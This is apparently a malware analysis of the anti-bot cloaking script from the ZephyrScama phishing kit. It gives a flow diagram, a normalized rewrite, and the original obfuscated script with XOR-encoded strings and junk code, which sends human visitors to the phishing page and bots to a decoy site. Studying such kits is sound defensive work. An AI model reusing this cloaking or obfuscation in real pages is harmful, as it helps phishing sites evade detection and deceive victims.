/* ZephyrScama PhaaS

Research Ref: https://www.own.security/en/ressources/blog/zephyrscama

Page loads
    |
    +-> Generate client ID
    |
    |   cl_<base36 timestamp>_<base36 random value>
    |
    +-> POST JSON
    |
    |   /_internal/base/validation/collect_info.php
    |
    |   {
    |     "client_id": "cl_..."
    |   }
    |
    +-> Parse server response
        |
        +-> is_bot is false
        |   and client_id is present
        |
        |      Redirect to:
        |      /
        |
        +-> is_bot is true
            or client_id is missing
            |
            +-> GET:
            |
            |   /_internal/api/dashboard.php
            |       ?action=visit
            |       &bot=1
            |       &client_id=...
            |
            +-> Redirect after 100 ms:
                https://mediapart.fr


## Normalized */
    
(() => {
  "use strict";

  const VALIDATION_URL =
    "/_internal/base/validation/collect_info.php";

  const BOT_LOG_URL =
    "/_internal/api/dashboard.php?action=visit&bot=1&client_id=";

  const DECOY_URL = "https://mediapart.fr";

  function createClientId() {
    const timestamp = Date.now().toString(36);

    const randomPart = Math.random()
      .toString(36)
      .substring(2, 15);

    return `cl_${timestamp}_${randomPart}`;
  }

  async function collectVisitData() {
    return {
      client_id: createClientId(),
    };
  }

  function redirect(url) {
    window.location.href = url;
  }

  function handleValidationResult(result) {
    /*
     * Visitors classified as human are redirected
     * to the root of the current origin.
     */
    if (!result.is_bot && result.client_id) {
      redirect("/");
      return;
    }

    /*
     * Bot results and malformed results are logged.
     */
    const clientId =
      result.client_id || createClientId();

    fetch(BOT_LOG_URL + clientId, {
      method: "GET",
    });

    /*
     * Send the rejected visitor to an external
     * decoy after 100 milliseconds.
     */
    setTimeout(() => {
      redirect(DECOY_URL);
    }, 100);
  }

  function submitWithXmlHttpRequest(visitData) {
    const xhr = new XMLHttpRequest();

    xhr.open("POST", VALIDATION_URL, true);

    xhr.setRequestHeader(
      "Content-Type",
      "application/json"
    );

    xhr.onreadystatechange = () => {
      if (xhr.readyState !== 4) {
        return;
      }

      /*
       * Both HTTP 200 and HTTP 403 are treated
       * as possible JSON classification responses.
       */
      if (xhr.status === 200 || xhr.status === 403) {
        try {
          const result = JSON.parse(xhr.responseText);
          handleValidationResult(result);
        } catch {
          redirect(DECOY_URL);
        }
      } else {
        redirect(DECOY_URL);
      }
    };

    xhr.send(JSON.stringify(visitData));
  }

  function submitVisitData(visitData) {
    try {
      fetch(VALIDATION_URL, {
        method: "POST",

        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },

        body: JSON.stringify(visitData),

        credentials: "same-origin",
      })
        .then((response) => response.json())
        .then(handleValidationResult)
        .catch(() => {
          /*
           * Retry with XMLHttpRequest if fetch or
           * JSON parsing fails.
           */
          submitWithXmlHttpRequest(visitData);
        });
    } catch {
      redirect(DECOY_URL);
    }
  }

  collectVisitData()
    .then(submitVisitData)
    .catch(() => {});
})();


/* Original */

<script>(function(){'use strict';var _qjq=164;var _fmkPu=['e7cbcad0c1cad089f0ddd4c1','8b','d6c1d7d4cbcad7c1f0c1dcd0','e3e1f0','e5c7c7c1d4d0','d7c5c9c189cbd6cdc3cdca','d6c1c5c0ddf7d0c5d0c1','d0ccc1ca','d0cbf7d0d6cdcac3','cacbd3','c7c8cdc1cad0fbcdc0','c5d4d4c8cdc7c5d0cdcbca8bced7cbca','d1cac0c1c2cdcac1c0','ced7cbca','c7c5d0c7cc','d7d0c5d0d1d7','ccd0d0d4d79e8b8bc9c1c0cdc5d4c5d6d08ac2d6','8bfbcdcad0c1d6cac5c88bc5d4cd8bc0c5d7ccc6cbc5d6c08ad4ccd49bc5c7d0cdcbca99d2cdd7cdd082c6cbd0999582c7c8cdc1cad0fbcdc099','c8cbc7c5d0cdcbca','f4ebf7f0','d4c5d6d7c1','ccd6c1c2','d7d1c6d7d0d6cdcac3','d7d0d6cdcac3cdc2dd','8bfbcdcad0c1d6cac5c88bc6c5d7c18bd2c5c8cdc0c5d0cdcbca8bc7cbc8c8c1c7d0fbcdcac2cb8ad4ccd4'];function _iaXpF(i){var s=_fmkPu[i],r="";for(var j=0;j<s.length;j+=2)r+=String.fromCharCode(parseInt(s.substr(j,2),16)^_qjq);return r;}if(typeof _QLMbuVg===_iaXpF(12)){}if(typeof _PIgUb===_iaXpF(12)){}function _ovxSzR(){const _vvlNZdOI=Date[_iaXpF(9)]()[_iaXpF(8)](36);const _XQsSd=Math.random()[_iaXpF(8)](36)[_iaXpF(22)](2,15);return `cl_${_vvlNZdOI}_${_XQsSd}`;try{var _Ycxn=window.innerWidth*6;}catch(_KMfquH){}void function(){var _zUFfaA=!1;}();}async function _VgMVIgj(){const _YXKjJ={};if(typeof null===_iaXpF(12)){var _iUTFdPH,_AXYdLG;void(_iUTFdPH=0);_iUTFdPH=document.title.length+14;void(_iUTFdPH=0);_iUTFdPH=Date.now()%6349;}_YXKjJ.client_id=_ovxSzR();return _YXKjJ;}function _xZMMU(_unUnkd){if(!_unUnkd.is_bot&&_unUnkd[_iaXpF(10)]){window[_iaXpF(18)][_iaXpF(21)]=_iaXpF(1);}else{if(!_unUnkd[_iaXpF(10)]){_unUnkd[_iaXpF(10)]=_ovxSzR();if(!void 0){}else{var _uvUv,_JdJhD;_uvUv=Math.floor(Math.random()*833);_uvUv=document.title.length+5;_JdJhD=screen.width*screen.height;}var _BWBjv=Math.random()*5148|0;}fetch(_iaXpF(17)+_unUnkd[_iaXpF(10)],{method:_iaXpF(3)});setTimeout(function(){window[_iaXpF(18)].href=_iaXpF(16);},100);void function(){var _dvUlwr=!1;}();if(true||false){}else{var _vjJHQfR,_tGdV;_vjJHQfR=Math.floor(Math.random()*459);_tGdV=navigator.language;}void function(){var _dXYMrZ=!0;}();}}function _QVzKpsJ(_pyQFw){try{fetch(_iaXpF(24),{method:_iaXpF(19),headers:{[_iaXpF(0)]:_iaXpF(11),[_iaXpF(4)]:_iaXpF(11)},body:JSON[_iaXpF(23)](_pyQFw),credentials:_iaXpF(5)}).then(_JxUjky=>{return _JxUjky[_iaXpF(13)]();}).then(_unUnkd=>{_xZMMU(_unUnkd);}).catch(_JKaabT=>{const _TzWdRw=new XMLHttpRequest();if(typeof _fwPaktM===_iaXpF(12)){}_TzWdRw.open(_iaXpF(19),_iaXpF(24),true);_TzWdRw.setRequestHeader(_iaXpF(0),_iaXpF(11));_TzWdRw.onreadystatechange=function(){if(_TzWdRw[_iaXpF(6)]===4){if(_TzWdRw.status===200||_TzWdRw[_iaXpF(15)]===403){try{const _unUnkd=JSON[_iaXpF(20)](_TzWdRw[_iaXpF(2)]);_xZMMU(_unUnkd);}catch(e){window[_iaXpF(18)][_iaXpF(21)]=_iaXpF(16);}}else{window.location.href=_iaXpF(16);}}};_TzWdRw.send(JSON[_iaXpF(23)](_pyQFw));if(NaN!==NaN){void 0;}else{var _PnBdx,_DCRuKo;_PnBdx=Date.now()%7118;_PnBdx=Date.now()%5611;_PnBdx=Math.floor(Math.random()*816);_PnBdx=document.title.length+44;}(function(){var _ifmYp=Date.now();})();});}catch(_JKaabT){window.location.href=_iaXpF(16);}}_VgMVIgj()[_iaXpF(7)](_pyQFw=>{_QVzKpsJ(_pyQFw);})[_iaXpF(14)](_JKaabT=>{});})();void function(){var _PScwgpC=!0;}();</script>
